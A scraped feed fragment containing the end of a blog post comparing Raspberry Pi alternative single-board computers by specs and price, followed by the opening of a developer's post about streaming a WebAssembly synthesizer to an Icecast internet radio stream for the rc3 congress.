RAM.</td><td><a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=284">Buy Now at Friendly Arm!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NanoPi_R4S">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ZeroPi<br><em>A ultra budget Quad Core ARM SBC with a Gigabit NIC at a very low price.</em></td><td><a href="https://www.friendlyarm.com/index.php?route=product/product&amp;path=69&amp;product_id=266&amp;sort=p.price&amp;order=ASC">Buy Now at Friendly Arm!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ZeroPi">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" alt="Jetson Nano Developer Kit" data-recalc-dims="1" data-old-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td><em>NVIDIA Jetson Nano<br>A powerful Arm SBC featuring an onboard NVIDIA GPU.</em></td><td><a href="https://www.amazon.co.uk/gp/product/B08J157LHH/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B08J157LHH&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=5fccf89294b3c2fbd9e717042f2bd603" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano">More Info</a></td></tr><tr><td><img src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;ssl=1" data-lazy-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Asus Tinker Board &nbsp;<br>A powerful Well supported Quad Core SBC</td><td><a href="https://www.amazon.co.uk/gp/product/B06VSBVQWS/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B06VSBVQWS&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=acaac47fe896ec85341ec08c83f900a2" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Asus_Tinker_Board">More Info</a></td></tr><tr><td><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://pbs.twimg.com/media/EmIHW1PU0AACi0A?format=jpg&amp;name=900x900" alt="Image" data-old-src="https://pbs.twimg.com/media/EmIHW1PU0AACi0A?format=jpg&amp;name=900x900" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Sipeed XuanTie C906 <br>A yet to be released $12 RISC-V SBC</td><td><a href="https://twitter.com/SipeedIO/status/1324632751157374977">More Info on Twitter</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Sipeed_XuanTie_C906">More Info</a></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table></figure>




<h2><span id="Hackboard_2"></span>Hackboard 2<span></span></h2>



<figure><img src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Hackboard 2<br></figcaption></figure>



<h3>Details</h3>



<p>The Hackboard 2 is a newly crowdfunded mid sized SBC that is larger than the Raspberry Pi 4 model B at 120x80mm. <br></p>



<p>The specs are as follows:</p>



<ul><li>Dual Core Intel Celeron N4020 CPU</li><li>4GB DDR4 RAM</li><li>64GB EMMC</li><li>2x M.2 slots</li><li>Gigabit Ethernet</li><li>3x USB 3.0 Type B ports</li><li>HDMI</li><li>Audio Jack</li><li>40 pin Pi compatible GPIO</li><li>Wifi and bluetooth</li></ul>



<div><p>The board design is compact but functional featuring a Power button, LED power status/system LED and a small RTC battery. </p><p>Windows is installed out of the box and any x86 compatible Linux distributions can easily be installed.   </p><p>Keep an eye out for my upcoming review!</p></div>



<h3>Pricing</h3>



<p>The hackboard 2 starts at $99 Shipping with Ubuntu or $140 Shipped with Windows 10 Pro. This may seem pricey in comparison to the Raspberry Pi 4 Model B however the Windows 10 version is cheaper than a Windows 10 Pro Licence and almost any Linux distro or x86 OS is compatible out of the box. </p>



<p>The HackBoard 2 is available to purchase now at <a href="https://www.crowdsupply.com/hackboard/hb2" target="_blank" rel="noreferrer noopener">crowdsupply</a>.</p>



<h2><span id="ZimaBoard"></span>ZimaBoard<span></span></h2>



<figure><img src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" alt="ZimaBoard-Case" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Zimaboard With its passive heatsink/case</figcaption></figure>



<h3>Details</h3>



<p><br>Running a home server on a SBC isn’t anything new, I’ve personally been doing it since the release of the Raspberry Pi Model B in 2012. However no SBC has been designed specifically for this purpose. That is until now! The ZimaBoard is a SBC designed to be used for server applications and is available in two different configurations:<br></p>



<div><div>
<figure><table><tbody><tr><td>Spec</td><td>ZimaBoard 216</td><td>ZimaBoard 832</td></tr><tr><td>CPU</td><td>Intel Celeron N3350</td><td>Intel Celeron N3450</td></tr><tr><td>RAM</td><td>2GB LPDDR4</td><td>8G LPDDR4</td></tr><tr><td>Onboard Storage</td><td>16GB eMMC</td><td>32GB eMMC</td></tr><tr><td>HDD/SSD</td><td>2x SATA 6.0 Ports</td><td>2x SATA 6.0 Ports</td></tr><tr><td>LAN</td><td>2x GbE  Ports</td><td>2x GbE Ports</td></tr><tr><td>USB</td><td>2x USB 3.0 Ports</td><td>2x USB 3.0 Ports</td></tr><tr><td>PCI-E</td><td>1x PCIe 2.0 4x</td><td>1x PCIe 2.0 4x</td></tr><tr><td>Display</td><td>1x Mini Display Port 1.2</td><td>1x Mini Display Port 1.2</td></tr><tr><td>TDP</td><td>6w</td><td>6w</td></tr><tr><td>Dimensions</td><td>120 x 74.5 x 25 mm</td><td>120 x 74.5 x 25 mm</td></tr></tbody></table><figcaption>ZimaBoard Specs</figcaption></figure>



<div><p>The ZimaBoard is small, fanless and very low powered with its 6w Apollo lake CPU making it perfect as a lightweight home server. </p><p>Whilst the ZimaBoard has not yet been funded it is expected to be released at some point during 2021. </p><p>Check out my press release on the ZimaBoard <a href="https://blog.jmdawson.co.uk/zimaboard-a-70-single-board-home-server/" target="_blank" rel="noreferrer noopener">here</a></p></div>



<h3>Pricing</h3>



<p>Both models will soon be available to back on kickstarter priced at $69.90 and $129.90 respectively.</p>
</div></div>



<h2><span id="RockPi_4_Model_B"></span>RockPi 4 Model B<span></span></h2>



<figure><img src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>RockPi 4</figcaption></figure>



<h3>Details</h3>



<p>The Rock Pi 4 is a small SBC that uses the same form factor as the Raspberry Pi Model B. Featuring a Hex Core Rockchip RK3399 it is very powerful for the form factor and price. <br></p>



<p>The Specs are as follows:</p>



<ul><li>1.8Ghz 6 Core 64Bit Rockchip RK3399 CPU</li><li>LPDDR4 RAM Available in:<ul><li>1GB</li><li>2GB</li><li>4GB</li></ul></li><li>Storage<ul><li>Optional EMMC Module in 8,16,32,64 and 128GB</li><li>Micro SD Card</li><li>NVME M.2 Connector supporting up to 2TB SSD</li></ul></li><li>3.5mm Audio Jack</li><li>802.11 ac wifi</li><li>Bluetooth 5.0</li><li>2x USB 3.0</li><li>2x USB 2.0</li><li>GbE NIC with PoE Support (Additional HAT required for POE)</li></ul>



<h3>Pricing</h3>



<p>The RockPi 4 starts at $49 for the 1GB Model, $59 for the 2GB Model and $75 for the 4GB Model. <br></p>



<p>The RockPi 4 is available to purchase on <a href="https://www.amazon.co.uk/gp/product/B07XD8HZBY/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B07XD8HZBY&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=1026f70c5b125cfadf15c563c959d9bf" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon</a>. </p>



<h2><span id="ODROIDH2+"></span> ODROID-H2+<span></span></h2>



<figure><img src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;ssl=1" alt="Odroid-H2+ [77800]" data-recalc-dims="1" data-old-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;ssl=1" data-lazy-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>ODROID-H2+</figcaption></figure>



<h3>Details</h3>



<p>The ODROID-h2+ is a Quad core x86 board featuring a 2.5Ghz Intel J4115 CPU. Whilst this is not strictly a SBC due to the removable memory DIMMS it is still fitting with this list although the lack of GPIO may make it unsuitable for some projects. <br></p>



<p>Due to the Dual Nics this would make a great software router or home server.</p>



<h3>Specs</h3>



<ul><li>Intel Quad-core processor J4115 (14nm) with 4MiB Cache, up to 2.5Ghz(Single Thread) or 2.3Ghz(Multi Thread)</li><li>Dual-channel Memory DDR4-PC19200 (2400MT/s)</li><li>Total 32GiB RAM Space with two SO-DIMM slots</li><li>4 x PCIe 2.0 for one M.2 NVMe storage</li><li>2 x 2.5Gbit Ethernet ports</li><li>2 x SATA 3.0</li><li>SSE4.2 accelerator (SMM, FPU, NX, MMX, SSE, SSE2, SSE3, SSSE3, SSE4.1, SSE4.2, AES)</li><li>Intel UHD Graphics 600 (Gen9.5 LP GT1) up to 700Mhz</li><li>HDMI 2.0 and DP 1.2 multiple 4K/60Hz video outputs</li><li>RTC / BIOS backup battery is included</li></ul>



<h3>Pricing</h3>



<p>The ODROID-h2+ is available at $119.00 although keep in mind you will need to purchase DDR4-PC19200&nbsp; SODIMM RAM separately.<br></p>



<p>The ODROID-h2+ is available to purchase in the UK <a href="https://www.odroid.co.uk/ODroid-H2" target="_blank" rel="noreferrer noopener">here</a> or for the rest of the world <a href="https://www.hardkernel.com/shop/odroid-h2plus/" target="_blank" rel="noreferrer noopener">here</a>. <br></p>



<h2><span id="NanoPi_R4S"></span>NanoPi R4S<span></span></h2>



<figure><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The NanoPi R4S is a tiny SBC designed to be used as a firewall or router featuring the Hex Core RK3399 CPU and Dual Gigabit Ethernet. The friendly ARM range isn’t new to me and their support is fantastic. Check out my previous review of their <a href="https://blog.jmdawson.co.uk/nanopi-fire-3-review/" target="_blank" rel="noreferrer noopener">NanoPi Fire 3</a>.</p>



<h3>Specs</h3>



<ul><li>1.8Ghz 6 Core 64Bit Rockchip RK3399 CPU</li><li>1GB DDR3 or 4GB LPDDR4 RAM</li><li>MicroSD Storage</li><li>Dual Gigabit NICs</li><li>2x USB 3.0 Type A</li><li>MicroSD Card Storage</li></ul>



<h3>Pricing</h3>



<p>The NanoPi R4s Starts at $45 for the 1GB model and $69 for the 4GB Model.</p>



<p>The NanoPi R4S is available directly from friendly arm <a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=284" target="_blank" rel="noreferrer noopener">here</a></p>



<h2><span id="ZeroPi"></span>ZeroPi<span></span></h2>



<figure><img src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The ZeroPi is another product from Friendly Arm starting at the very low price of just $9.99. Featuring a Quad-core Allwinner H3 CPU running at 1.2Ghz. Although there is no GPIO making it useless for some projects for anyone wanting a low powered very cheap Linux SBC this is a bargain! </p>



<h3>Specs</h3>



<ul><li>1.2Ghz Quad Core Allwinner H3 CPU</li><li>512MB DDR3 RAM</li><li>MicroSD Slot for storage</li><li>Gigabit Ethernet</li><li>1x USB 2.0</li></ul>



<h3>Pricing</h3>



<p>The ZeroPi is available now for $9.99 or for an extra $3 you can have a nice metal enclosure. </p>



<p>Available to purchase now at <a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=266&amp;search=zeropi&amp;description=true&amp;category_id=0&amp;sub_category=true" target="_blank" rel="noreferrer noopener">Friendly Arm</a></p>



<h2><span id="NVIDIA_Jetson_Nano"></span>NVIDIA Jetson Nano<span></span></h2>



<figure><img src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" alt="Jetson Nano Developer Kit" data-recalc-dims="1" data-old-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The NVIDIA Jetson Nano is the latest in the line of NVIDIA SBC Development Kits featuring a Quad Core Arm A57 @ 1.43GHz and a 128 Core Maxwell GPU. </p>



<h3>Specs<br></h3>



<ul><li>128 Core Maxwell GPU</li><li>1.43GHz Quad Core A57 CPU</li><li>4GB LPDDR4 RAM</li><li>MicroSD Storage</li><li>Gigabit Ethernet</li><li>HDMI</li></ul>



<h3>Pricing</h3>



<p>The NVIDIA Jetson Nano is available for £64 from <a href="https://www.amazon.co.uk/gp/product/B08J157LHH/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B08J157LHH&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=5fccf89294b3c2fbd9e717042f2bd603" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon UK</a> or for around $90 in the rest of the world. </p>



<h2><span id="Asus_Tinker_Board"></span>Asus Tinker Board &nbsp;<span></span></h2>



<figure><img src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;ssl=1" data-lazy-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Asus Tinker Board</figcaption></figure>



<p>The ASUS Tinker Board is ASUS’ first commercial SBC designed as a direct competitor to the Raspberry Pi Model B. Although this board is using ageing technology it is still a viable alternative down to the level of documentation and support provided by ASUS. <br></p>



<h3>Specs</h3>



<ul><li>Rockchip Quad-Core RK3288 processor</li><li>2GB Dual Channel DDR3</li><li>MicroSD Storage</li><li>802.11 WIFI</li><li>Bluetooth 4.0</li><li>Gigabit Ethernet</li><li>40-pin Pi compatible GPIO</li></ul>



<h3>Pricing</h3>



<p>The ASUS Tinker Board is priced at around £40 in the UK and can be purchased on <a href="http://uct/B06VSBVQWS/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B06VSBVQWS&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=acaac47fe896ec85341ec08c83f900a2" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon</a>.</p>



<p>Pricing for the rest of the world is around $60</p>



<h2><span id="Sipeed_XuanTie_C906"></span>Sipeed XuanTie C906<span></span></h2>



<p>Little is known about the Sipeed XuanTie C906 as it is yet to be released however it looks to be the first budget SBC to use the RISC-V architecture making it somewhat special. </p>



<p>The only details available for this board were released back in November of 2020 in a tweet however I have spoken to sipeed and they confirmed the following: <br></p>



<p><em>Hello,<br>We will release it in February, please keep following us on twitter, we will update in time on twitter.Thank you very much for your support and attention to us.<br>Best regards,<br>Orgmar<br><a href="http://www.sipeed.com/" target="_blank" rel="noreferrer noopener">www.sipeed.com</a></em></p>



<blockquote><p lang="en" dir="ltr">Good News: <br>We get first chip which based on XuanTie C906 (RV64GCV), <br>it have abundant interface (HDMI/RGB/DVP/MIPI/GMAC/…), <br>and will be able to run Debian system.<br>Last and most important, the basic dev board price is start at 12.5$ (1% of HiFive Unleashed)。 <a href="https://t.co/EJbXTJ5eMb">pic.twitter.com/EJbXTJ5eMb</a></p>— Sipeed (@SipeedIO) <a href="https://twitter.com/SipeedIO/status/1324632751157374977?ref_src=twsrc%5Etfw">November 6, 2020</a></blockquote> 



<h2><span id="Conclusion"></span>Conclusion <span></span></h2>



<p>If you are looking at Raspberry Pi alternatives in 2021 there is a range of options at various specifications and prices. Although at the time of writing some of these options are yet to be released I believe that they will be relevant within the next few months. </p>



<p>Raspberry Pi alternatives have always been an interest to me as they often create innovating products before the Raspberry Pi foundation. This is not to say I have anything against Raspberry Pi’s they are absolutely the well deserved leader in this market and still offer the best support and community. </p>



<div><p>If anyone believes I have missed a Raspberry Pi alternative from the list please comment below and I will review it and potentially add it to the list. </p><p>Watch this space as a good amount of the SBC’s mentioned in this list will be reviewed by myself in early 2021.   </p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569407</guid>
            <pubDate>Tue, 29 Dec 2020 13:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a virtual concert venue for artists]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25569112">thread link</a>) | @timdaub
<br/>
December 29, 2020 | https://timdaub.github.io/2020/12/27/wasm-stream/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/12/27/wasm-stream/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><strong>TL;DR:</strong> I built a <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">synthesizer</a> that allows streaming directly to an <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/">internet radio stream</a>. Below is the live stream:</p>
<p><audio controls="" autoplay="" preload="auto">
<source src="https://audio.daubenschuetz.de/stream.ogg" type="audio/ogg">
<source src="https://audio.daubenschuetz.de/stream" type="audio/mpeg">
<p>Your browser does not support the audio element. </p></audio></p>
<hr>
<p>It's that time between Christmas and new year again, where you can usually find me at Leipzig's Congress Zentrum on my computer hacking away. It's chaos congress time. Given this year's pandemic, the "37c3" however, was moved to the internet and renamed to <a target="_blank" rel="noopener" href="https://rc3.world/">"rc3", the Remote Chaos Communication Congress</a>.</p>
<p>Earlier this month, the iconic congress build-up started. This time around, building up didn't involve moving heavy crates of mate tea around. Instead, it meant that everyone started designing, drawing, and building their assembly maps for the "rc3.world". A <a target="_blank" rel="noopener" href="https://events.ccc.de/2020/09/04/rc3-remote-chaos-experience/">2D virtual space</a> that's supposed to replace this year's lack of physical space.</p>
<p>The rc3.world software is a fork of <a target="_blank" rel="noopener" href="https://workadventu.re/">workadventu.re</a>, a 2D game simulating a virtual work environment with avatars. Within this 2D map of the virtual congress, the organizers invited all assemblies to build their own spaces. And so, as the build-up for <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a> assembly began, I had an idea for a project.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-synth-screenshot.png" alt=""><figcaption><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, the project I launched at last year's c3</figcaption>
</figure>
<p>At last year's congress in Leipzig, I had launched <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, a synthesizer built in WebAssembly. Naturally, this time I was eager to take the project to the next stage. Hence, roughly a week ago, I started to work on a new project called "WASM-STREAM" - an extension to wasm-synth.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/social-dist0rtion-protocol/wasm-stream">WASM-STREAM</a> is a virtual stage for digital artists. Using WASM-STREAM, an artist can broadcast their play with wasm-synth to an internet radio stream. More importantly, though, this means that they can take the stage on the <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a>'s assembly and jam away to a virtually present audience.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-stream.png" alt=""><figcaption>Social Dist0rtion Protocol's dance floor in the rc3.world</figcaption>
</figure>
<p>So how did I build it?</p>
<h2 id="a-first-little-demo">A First Little Demo</h2>
<p><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a> is a project that I built deliberately to showcase the power of the web. At the beginning of the year, I wrote <a href="https://timdaub.github.io/2020/02/19/wasm-synth/">a blog post</a> outlining its technical details. It's using the <code>AudioWorklet</code> and some WebAssembly-transpiled code to render audio in real-time in the user's browser.</p>
<p>Now, workadventure, the software ccc uses to run their rc3.world, is also built on the web and allows embedding audio streams. So I thought, why not take the audio generated in wasm-synth and stream it to everyone in the rc3 world.</p>
<p>In a way, it sounds like not that big of a deal to build an audio streaming client within a website. But remember that a browser's networking ability is limited. While we've come a long way from the <code>XMLRequest</code> API to <code>fetch</code>, <code>WebSocket</code> and <code>WebRTC</code>, these concepts only allow talking upstream if their authors deliberately built their upstream application for supporting them.</p>
<p>Naive as I Am, I started by deploying <a target="_blank" rel="noopener" href="https://icecast.org/">icecast2</a> to a small Hetzner instance. I configured an authorized mount point that allows a streamer to connect using client software. Then I looked for a way to stream audio directly to icecast from a browser. And found... nothing.</p>
<p>Well, I did find something. It's called <a target="_blank" rel="noopener" href="https://webcast.github.io/">webcast</a>, and it's a <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">WebSocket-based subprotocol</a> that allows sending binary audio data between a client and a server. In their <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js#server">README.md</a>, the authors also mention webcast's compatibility with <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/">liquidsoap</a>, a DSL for audio stream processing.</p>
<p>So my first attempt at plugging these things together involved encoding the <code>Float32Array</code> data from the <code>AudioWorklet</code> into an mp3 stream using <a target="_blank" rel="noopener" href="https://github.com/toots/shine/">libshine</a> (that has a wasm JavaScript package) and then sending it to a <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/doc-dev/harbor.html">liquidsoap "harbor"</a> via webcast. Liqidsoap would then convert the mp3 stream to ogg-vorbis, make it stereo, and forward it to the icecast server.</p>
<p>And, to my surprise, it worked. When I hit some keys on the wasm-synth, they got encoded and sent to the audio stream. With a bit of delay, I heard what I had just played. Cool!</p>
